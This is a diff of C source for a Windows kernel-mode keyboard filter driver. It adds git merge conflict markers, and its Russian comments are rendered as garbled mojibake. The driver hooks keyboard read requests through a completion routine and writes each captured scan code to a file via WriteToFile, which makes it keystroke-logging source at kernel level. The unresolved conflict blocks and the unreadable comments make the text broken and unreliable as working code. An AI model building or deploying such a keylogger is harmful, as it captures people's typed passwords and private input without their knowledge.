@@ -1,7 +1,44 @@
 Ôªø#include "Source.h"
 #include "ScanCodes.h"
 
+<<<<<<< HEAD
 static int REQUESTS = 0; //—á–∏—Å–ª–æ –Ω–µ–∑–∞–≤–µ—Ä—à—ë–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
+=======
+//¬ ˝ÚÓÏ ÔÓÒÚÓÏ ÔËÏÂÂ Ï˚ ËÒÔÓÎ¸ÁÓ‚‡ÎË Ú‡ÍÊÂ ‰ËÂÍÚË‚˚ #pragma alloc_text(INIT, DriverEntry) Ë #pragma alloc_text(PAGE, UnloadRoutine). Œ·˙ˇÒÌ˛ ˜ÚÓ ÓÌË ÓÁÌ‡˜‡˛Ú: ÔÂ‚‡ˇ ÔÓÏÂ˘‡ÂÚ ÙÛÌÍˆË˛ DriverEntry ‚ INIT ÒÂÍˆË˛, ÚÓ ÂÒÚ¸ Í‡Í ·˚ „Ó‚ÓËÚ, ˜ÚÓ DriverEntry ·Û‰ÂÚ ‚˚ÔÓÎÌÂÌ‡ Ó‰ËÌ ‡Á Ë ÔÓÒÎÂ ˝ÚÓ„Ó ÍÓ‰ ÙÛÌÍˆËË ÏÓÊÌÓ ÒÔÓÍÓÈÌÓ ‚˚„ÛÁËÚ¸ ËÁ Ô‡ÏˇÚË. ¬ÚÓ‡ˇ ÔÓÏÂ˜‡ÂÚ ÍÓ‰ ÙÛÌÍˆËË UnloadRoutine Í‡Í ‚˚„ÛÊ‡ÂÏ˚È, Ú.Â. ÔË ÌÂÓ·ıÓ‰ËÏÓÒÚË, ÒËÒÚÂÏ‡ ÏÓÊÂÚ ÔÂÂÏÂÒÚËÚ¸ Â„Ó ‚ Ù‡ÈÎ ÔÓ‰Í‡˜ÍË, ‡ ÔÓÚÓÏ Á‡·‡Ú¸ Â„Ó ÓÚÚÛ‰‡.
+
+/*
+#pragma alloc_text(INIT, DriverEntry)
+#pragma alloc_text(PAGE, Unload)
+*/
+
+/*
+typedef struct _DEVICE_EXTENSION { PDEVICE_OBJECT pKeyboardDevice;
+									PETHREAD pThreadObj;
+									bool bhThreadTerminate;
+									HANDLE hLogFile;
+									KEY_STATE kState;
+									KSEMAPHORE semQueue;
+									KSPIN_LOCK lockQueue;
+									LIST_ENTRY QueueListHead;
+									} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
+*/
+
+//—ÚÛÍÚÛ‡ ÒÓÓÚ‚ÂÚÒÚ‚ÛÂÚ Ì‡Ê‡ÚÓÈ ÍÎ‡‚Ë¯Â
+typedef struct _KEYBOARD_INPUT_DATA { 
+									USHORT UnitId;
+									USHORT MakeCode;
+									USHORT Flags;
+									USHORT Reserved;
+									ULONG ExtraInformation;
+									} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;
+
+
+typedef struct _DEVICE_EXTENSION {
+	PDEVICE_OBJECT pKeyboardDevice;
+} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
+
+LONG64 volatile REQUESTS; //˜ËÒÎÓ ÌÂÁ‡‚Â¯∏ÌÌ˚ı Á‡ÔÓÒÓ‚
+>>>>>>> master
 
 NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 {
@@ -16,6 +53,7 @@ NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 		int nKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
 		for (int i = 0; i < nKeys; ++i)
 		{
+<<<<<<< HEAD
 			//–ï—Å–ª–∏ –∫–ª–∞–≤–∏—à–∞ –Ω–∞–∂–∞—Ç–∞
 			//??? CHANGED!! was Break!
 			//if (keys[i].Flags == KEY_MAKE)
@@ -44,6 +82,11 @@ NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 					FALSE);
 				
 			//}
+=======
+			DbgPrint("Code: %x\n", keys[i].MakeCode);
+			//«‡ÔËÒ¸ ‚ Ù‡ÈÎ
+			WriteToFile(keys[i].MakeCode);
+>>>>>>> master
 		}
 	}
 
@@ -66,18 +109,29 @@ NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 //–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ —á—Ç–µ–Ω–∏–µ
 NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {
+<<<<<<< HEAD
 	DbgPrint("Entering DispatchRead\n");
 
 	
 	//–ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º —Ç–µ–∫—É—â–∏–π —É–∫–∞–∑–∞—Ç–µ–ª—å —Å—Ç–µ–∫–∞ —Ç–∞–∫, —á—Ç–æ–±—ã –æ–Ω —É–∫–∞–∑—ã–≤–∞–ª –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏ –Ω–∏–∂–µ–ª–µ–∂–∞—â–µ–≥–æ –¥—Ä–∞–π–≤–µ—Ä–∞
+=======
+
+	InterlockedIncrement64(&REQUESTS);
+
+	//Õ‡ÒÚ‡Ë‚‡ÂÏ ÛÍ‡Á‡ÚÂÎ¸ ÒÚÂÍ‡ ‰Îˇ ÌËÊÂÎÂÊ‡˘Â„Ó ‰‡È‚Â‡
+>>>>>>> master
 	IoCopyCurrentIrpStackLocationToNext(pIrp);
 
 	//–ü–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∑–∞–ø—Ä–æ—Å–∞ –≤—ã–∑—ã–≤–∞–µ–º —É–∫–∞–∑–∞–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é
 	IoSetCompletionRoutineEx(pDeviceObject, pIrp, ReadCompleted, pDeviceObject, TRUE, TRUE, TRUE);
 
+<<<<<<< HEAD
 	//–£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤
 	++REQUESTS;
 	DbgPrint("DR \t%d\n", REQUESTS);
+=======
+	
+>>>>>>> master
 
 	//–ü–µ—Ä–µ–¥–∞—ë–º IRP-–ø–∞–∫–µ—Ç —Å–ª–µ–¥—É—é—â–µ–º—É –¥—Ä–∞–π–≤–µ—Ä—É
 	//pKeyboardDevice - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–π –¥—Ä–∞–π–≤–µ—Ä –≤ —Ü–µ–ø–æ—á–∫–µ
@@ -392,9 +446,14 @@ char* Scancode2Key(char scanCode, char* keys)
 //PUNICODE_STRING - –ø—É—Ç—å –≤ —Ä–µ–µ—Å—Ç—Ä–µ –∫ –ø–æ–¥—Ä–∞–∑–¥–µ–ª—É –¥—Ä–∞–π–≤–µ—Ä–∞
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 {
+<<<<<<< HEAD
 	DbgPrint("Entering driver entry point\n");
 	//REQUESTS = 0;
 	DbgPrint("EP= %d", REQUESTS);
+=======
+	DbgPrint("Loading driver...\n");
+	REQUESTS = 0;
+>>>>>>> master
 	NTSTATUS NtStatus = 0; //STATUS_SUCCESS;
 	unsigned int i = 0;
 
